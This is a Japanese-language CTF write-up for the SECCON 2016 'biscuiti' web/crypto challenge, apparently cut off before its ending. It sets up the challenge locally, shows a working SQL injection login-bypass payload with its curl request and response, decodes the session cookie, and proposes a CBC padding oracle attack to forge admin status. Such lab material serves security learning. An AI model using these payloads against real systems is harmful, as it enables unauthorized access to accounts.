# biscuiti [Web, Crypto / 300pt]

## Problem
biscuiti

Can you login as admin?

[http://biscuiti.pwn.seccon.jp/](http://biscuiti.pwn.seccon.jp/)

[biscuiti.zip](https://github.com/AkashiSN/SECCON2016-Online-CTF/blob/master/Crypto/biscuiti/biscuiti.zip)

Note: You should estimate that exploits cost an hour.

## Answer

### 環境構築

[SECCON2016_online_CTF - GitHub](https://github.com/SECCON/SECCON2016_online_CTF/tree/master/Crypto/300_biscuiti)の

`build/README.md`にあるようにデプロイしてみる

```bash
cd build/deploy
vagrant up
sudo gem install itamae
itamae ssh --vagrant roles/main.rb
```

これで[http://localhost:10080](http://localhost:10080)で問題がホストされるようになった

### 問題を解く

![img](img.png)

問題ファイルの[index.php](https://github.com/AkashiSN/SECCON2016-Online-CTF/blob/master/Crypto/biscuiti/biscuiti/index.php)の認証部を見てみると


```sql
SELECT username, enc_password from user WHERE username='{$username}'
```

となっていて、SQLインジェクションができそう
ここに、

```sql
'UNION SELECT 'admin','adminadmin
```

を送り込んでやると

```sql
SELECT username, enc_password from user WHERE username=''UNION SELECT 'admin','adminadmin'
```

という文が完成して、

```plain
+-------+------------+
| admin | adminadmin |
+-------+------------+
```
というのが返ってくる。

```plain
$ curl -i -F "username='UNION SELECT 'admin','adminadmin" -F "password=" http://localhost:10080
HTTP/1.1 100 Continue

HTTP/1.1 200 OK
Date: Sat, 18 Nov 2017 05:04:29 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: JSESSION=YToyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NzoiaXNhZG1pbiI7Tjt9KSOL8reQbsVxc9b0b7idaQ%3D%3D
Vary: Accept-Encoding
Content-Length: 136
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html>
<head><title>Login</title></head>
<body>
Hello admin
<div><a href="logout.php">Log out</a></div>
</body>
</html>
```

`admin`としてログインできる

`%3D`は`=`なので、

```plain
JSESSION=YToyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NzoiaXNhZG1pbiI7Tjt9KSOL8reQbsVxc9b0b7idaQ==
```

これはBase64っぽいしポストするデータが同じだったら何回アクセスしても変わらない値っぽい

```bash
$ echo -n "YToyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NzoiaXNhZG1pbiI7Tjt9KSOL8reQbsVxc9b0b7idaQ==" | base64 -d
a:2:{s:4:"name";s:5:"admin";s:7:"isadmin";N;})#����n�qs��o��i
```

`a:2:{s:4:"name";s:5:"admin";s:7:"isadmin";N;}`ここはセッション情報

[http://php.fnlist.com/php/unserialize](http://php.fnlist.com/php/unserialize)

ここで`unserialize`してみると

```php
array (
  'name' => 'admin',
  'isadmin' => NULL,
);
```

[index.php](https://github.com/AkashiSN/SECCON2016-Online-CTF/blob/master/Crypto/biscuiti/biscuiti/index.php)の一部

```php
if ($SESSION["isadmin"])
    include("../flag");
```

`isadmin`が`True`だったらよさそう

`)#����n�qs��o��i`これは

[index.php](https://github.com/AkashiSN/SECCON2016-Online-CTF/blob/master/Crypto/biscuiti/biscuiti/index.php)の一部

```php
define("ENC_KEY", "***censored***");
define("ENC_METHOD", "aes-128-cbc");
(省略)
function mac($input) {
    $iv = str_repeat("\0", 16);
    $c = openssl_encrypt($input, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
    return substr($c, -16);
}
```

ここでの`mac`値は`aes-128-cbc`で暗号化されていて、`ENC_KEY`はわからない。

しかし、任意のユーザーでログイン可能なため平文と`mac`値の双方を手に入れることができる。

その状態から

```php
array (
  'name' => 'admin',
  'isadmin' => ture,
);
```

となる`mac`値を求めれば良さそう。

[CBC modeに対するPadding oracle attackをやってみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2015/12/23/000923)

> ブロック暗号モードのひとつであるCBC modeには、Padding oracle attackと呼ばれる攻撃手法が存在することが知られている。 これは、繰り返し復号を行うことができ、かつ復号の成否が観測可能なとき、バイトごとのブルートフォースにより暗号文が復元できるというものである。

どうやら`Padding oracle attack`が使えそう

